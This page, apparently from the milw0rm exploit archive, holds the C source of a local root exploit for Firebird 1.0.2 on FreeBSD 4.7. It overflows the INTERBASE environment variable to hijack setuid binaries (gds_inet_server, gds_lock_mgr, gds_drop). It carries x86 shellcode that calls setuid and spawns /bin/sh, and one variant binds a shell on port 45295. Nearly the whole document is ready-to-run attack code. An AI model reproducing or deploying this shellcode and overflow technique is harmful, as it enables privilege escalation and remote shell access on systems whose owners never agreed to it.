<html><head><title>Firebird 1.0.2 FreeBSD 4.7-RELEASE Local Root Exploit</title></head><pre>/* DSR-firebird.c
   -------------------------------
Tested on: Firebird 1.0.2 FreeBSD 4.7-RELEASE
This is Proof Of concept code.
bash-2.05a$ ./DSR-firebird
( ( Firebird-1.0.2 Local exploit for Freebsd 4.7 ) )
( (                           by - bob@dtors.net ) )
----------------------------------------------------

Usage: ./DSR-firebird &lt;target#&gt; 
Targets:
1. [0xbfbff75d] - gds_inet_server
2. [0xbfbff75c] - gds_lock_mgr
3. [0xbfbff75e] - gds_drop

bash-2.05a$
*/


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#define LOCK    &quot;/usr/local/firebird/bin/gds_lock_mgr&quot;
#define DROP    &quot;/usr/local/firebird/bin/gds_drop&quot;
#define INET    &quot;/usr/local/firebird/bin/gds_inet_server&quot;
#define LEN     1056

char dropcode[]=
        &quot;\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80&quot; 
        &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;
	  &quot;\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0&quot;
	  &quot;\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&quot;; 

char inetcode[]=
        &quot;\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80&quot; 
        &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;
	  &quot;\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0&quot;
	  &quot;\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&quot;; 

                            

char lockcode[]= 
	&quot;\x31\xc0\x31\xdb\xb0\x02\xcd\x80&quot;
	&quot;\x39\xc3\x75\x06\x31\xc0\xb0\x01\xcd\x80&quot;
	&quot;\x31\xc0\x50\x6a\x5a\x53\xb0\x17\xcd\x80&quot; //setuid[firebird] by 
bob
	&quot;\x31\xc0\x31\xdb\x53\xb3\x06\x53&quot; //fork() bindshell by eSDee
	&quot;\xb3\x01\x53\xb3\x02\x53\x54\xb0&quot;
	&quot;\x61\xcd\x80\x89\xc7\x31\xc0\x50&quot;
	&quot;\x50\x50\x66\x68\xb0\xef\xb7\x02&quot;
      &quot;\x66\x53\x89\xe1\x31\xdb\xb3\x10&quot;
      &quot;\x53\x51\x57\x50\xb0\x68\xcd\x80&quot;
      &quot;\x31\xdb\x39\xc3\x74\x06\x31\xc0&quot;
      &quot;\xb0\x01\xcd\x80\x31\xc0\x50\x57&quot;
      &quot;\x50\xb0\x6a\xcd\x80\x31\xc0\x31&quot;
      &quot;\xdb\x50\x89\xe1\xb3\x01\x53\x89&quot;
      &quot;\xe2\x50\x51\x52\xb3\x14\x53\x50&quot;
      &quot;\xb0\x2e\xcd\x80\x31\xc0\x50\x50&quot;
      &quot;\x57\x50\xb0\x1e\xcd\x80\x89\xc6&quot;
      &quot;\x31\xc0\x31\xdb\xb0\x02\xcd\x80&quot;
      &quot;\x39\xc3\x75\x44\x31\xc0\x57\x50&quot;
      &quot;\xb0\x06\xcd\x80\x31\xc0\x50\x56&quot;
      &quot;\x50\xb0\x5a\xcd\x80\x31\xc0\x31&quot;
      &quot;\xdb\x43\x53\x56\x50\xb0\x5a\xcd&quot;
      &quot;\x80\x31\xc0\x43\x53\x56\x50\xb0&quot;
      &quot;\x5a\xcd\x80\x31\xc0\x50\x68\x2f&quot;
      &quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e&quot;
      &quot;\x89\xe3\x50\x54\x53\x50\xb0\x3b&quot;
      &quot;\xcd\x80\x31\xc0\xb0\x01\xcd\x80&quot;
      &quot;\x31\xc0\x56\x50\xb0\x06\xcd\x80&quot;
      &quot;\xeb\x9a&quot;;

char *decide(char *string)
{
    if(!(strcmp(string, &quot;1&quot;)))
      return((char *)&amp;inetcode);
    if(!(strcmp(string, &quot;2&quot;)))
      return((char *)&amp;lockcode);
    if(!(strcmp(string, &quot;3&quot;)))
      return((char *)&amp;dropcode);
    exit(0);
}

int main(int argc, char **argv)
{
	
	unsigned long ret = 0xbfbff743;
	  
	char *selectcode;
	char buffer[LEN];
	char egg[1024];
	char *ptr;
	int i=0;

  

	if(argc &lt; 2)
	{
		printf(&quot;( ( Firebird-1.0.2 Local exploit for Freebsd 
4.7 ) )\n&quot;); 
		printf(&quot;( (                           by - 
bob@dtors.net ) )\n&quot;);
		printf(&quot;---------------------------------------------------
-\n\n&quot;);
		printf(&quot;Usage: %s &lt;target#&gt; \n&quot;, argv[0]);
		printf(&quot;Targets:\n&quot;);
		printf(&quot;1. [0xbfbff743] - gds_inet_server\n&quot;);
		printf(&quot;2. [0xbfbff743] - gds_lock_mgr\n&quot;);
		printf(&quot;3. [0xbfbff743] - gds_drop\n&quot;);
		printf(&quot;\nwww.dtors.net\n&quot;);
		exit(0);
	}
  
	selectcode = (char *)decide(argv[1]);
  	memset(buffer, 0x41, sizeof(buffer));

        ptr = egg;

        for (i = 0; i &lt; 1024 - strlen(selectcode) -1; i++) *(ptr++) = 0x90;
        for (i = 0; i &lt; strlen(selectcode); i++) *(ptr++) = selectcode[i];
        egg[1024 - 1] = '\0';

        memcpy(egg,&quot;EGG=&quot;,4);
        putenv(egg);

        memcpy(&amp;buffer[1052],(char *)&amp;ret,4);
        buffer[1056] = 0;

        setenv(&quot;INTERBASE&quot;, buffer, 1);

        fprintf(stdout, &quot;Return Address: 0x%x\n&quot;, ret);
        fprintf(stdout, &quot;Buffer Size: %d\n&quot;, LEN);
        fprintf(stdout, &quot;Setuid [90]\n&quot;);

if(selectcode == (char *)&amp;inetcode)
  {
	execl(INET, INET, NULL);
	return 0;
   }

if(selectcode == (char *)&amp;lockcode)
  {
 	printf(&quot;\nShell is on port 45295\nExploit will hang!\n&quot;);
	execl(LOCK, LOCK, NULL);
	return 0;
   }

if(selectcode == (char *)&amp;dropcode)
  {
	execl(DROP, DROP, NULL);
	return 0;
   }

	
	return 0;
}


// milw0rm.com [2003-05-12]</pre></html>